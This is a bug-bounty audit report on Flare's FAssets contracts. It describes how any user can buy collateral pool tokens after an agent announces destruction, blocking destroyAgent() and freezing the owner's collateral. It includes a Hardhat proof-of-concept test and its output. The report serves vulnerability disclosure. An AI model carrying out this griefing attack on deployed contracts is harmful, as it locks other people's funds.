# #45499 \[SC-Low] Malicious user can prevent agent to be destroyed and lock up his funds

**Submitted on May 15th 2025 at 16:51:44 UTC by @holydevoti0n for** [**Audit Comp | Flare | FAssets**](https://immunefi.com/audit-competition/audit-comp-flare-fassets)

* **Report ID:** #45499
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/facets/AgentVaultManagementFacet.sol>
* **Impacts:**
  * Permanent freezing of funds

## Description

## Brief/Intro

Malicious users can permanently lock an agent's collateral by buying tokens from the collateral pool after the agent has announced destruction. This prevents the agent owner from completing the destruction process, effectively resulting in a DoS attack that permanently locks the agent's funds.

## Vulnerability Details

The agent destruction process in the protocol follows a specific sequence:

1. The agent owner announces the intention to destroy the agent via `announceDestroyAgent()`
2. After a waiting period, the owner calls `destroyAgent()` to complete the process and recover their collateral

The vulnerability occurs because during the waiting period between announcement and actual destruction, any user can purchase collateral pool tokens from the agent's pool calling `CollateralPool.enter()`. When this happens, the `destroyAgent()` function will fail at the following check in the `CollateralPool.destroy()` function: <https://github.com/flare-labs-ltd/fassets/blob/acb82a27b15c56ce9dfbb6dbbd76008da6753c26/contracts/assetManager/implementation/CollateralPool.sol#L833>

```solidity
  function destroy(address payable _recipient)
        external
        onlyAssetManager
        nonReentrant
    {
      ...
@>        require(token.totalSupply() == 0, "cannot destroy a pool with issued tokens");
       ...
    }
```

This check verifies that no pool tokens are in circulation before allowing destruction. However, there is no mechanism to prevent users from buying pool tokens after an agent has announced destruction, nor is there a way for the agent owner to force-redeem these tokens.

Here's a step by step on how an attacker can DoS the agent to be destroyed and thus locking up his funds:

1. An agent announces destruction with `announceDestroyAgent()`
2. The required waiting period passes
3. A user buys collateral pool tokens with `enter()`
4. When the agent owner attempts to call `destroyAgent()`, the transaction reverts with "cannot destroy a pool with issued tokens"

Notice this is not the same vulnerability that was reported in one of the previous bugs reported in:

```solidity
    it("39933: attacker can prevent agent from calling destroy by depositing malcious token to vault", async () => {
        const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1);
        // make agent available
        const fullAgentCollateral = toWei(3e8);
        await agent.depositCollateralsAndMakeAvailable(fullAgentCollateral, fullAgentCollateral);
        // deposit malicious token
        const MaliciousToken = artifacts.require("MaliciousToken");
        const maliciousToken = await MaliciousToken.new();
        // previously, this call worked and prevent later calling destroy()
        await expectRevert(agent.agentVault.depositNat(maliciousToken.address, { value: "1" }),
            "only asset manager");
        // close vault should work now
        await agent.exitAndDestroy();
    });
```

The reason is that the `CollateralPool.enter` allows to DoS the destroying process by minting collateral pool tokens.

## Impact Details

* Malicious users can permanently lock an agent's collateral by purchasing pool tokens after destruction is announced.
* The agent owner loses access to their funds with no recovery mechanism available. Permanent DoS as any user can always mint tokens to prevent the agent from being destroyed.

## Proof of Concept

Add the following test in `test/unit/fasset/library/Agent.ts`:

```javascript
   describe.only("destroy agent DoS", () => {
        it("should revert when try to destroy agent after announced withdrawal time passes", async () => {
            console.log("running this test...");
            // init
            const agentVault = await createAgent(agentOwner1, underlyingAgent1);
            const amount = ether('1');
            await depositCollateral(agentOwner1, agentVault, amount);
            // act
            await assetManager.announceDestroyAgent(agentVault.address, { from: agentOwner1 });
            // should update status
            const info = await assetManager.getAgentInfo(agentVault.address);
            assertWeb3Equal(info.status, 4);
            await deterministicTimeIncrease(150);
            // should not change destroy time
            await assetManager.announceDestroyAgent(agentVault.address, { from: agentOwner1 });
            await deterministicTimeIncrease(150);
            const startBalance = await usdc.balanceOf(agentOwner1);

            const pool = await CollateralPool.at(await agentVault.collateralPool());

            // @audit - user enter in the pool with 1 NAT to prevent agent being destroyed
            await agentVault.buyCollateralPoolTokens({ from: accounts[15], value: amount });

            // expect to revert with 'cannot destroy a pool with issued tokens'
            await expectRevert(assetManager.destroyAgent(agentVault.address, agentOwner1, { from: agentOwner1 }),
                "cannot destroy a pool with issued tokens");
        });
    });
```

run: `npx hardhat test` Output:

```javascript
  Contract: Agent.sol; test/unit/fasset/library/Agents.ts; Agent basic tests
   destroy agent DoS
 ✔ should revert when try to destroy agent after announced withdrawal time passes (87ms)
  1 passing (2s)
```
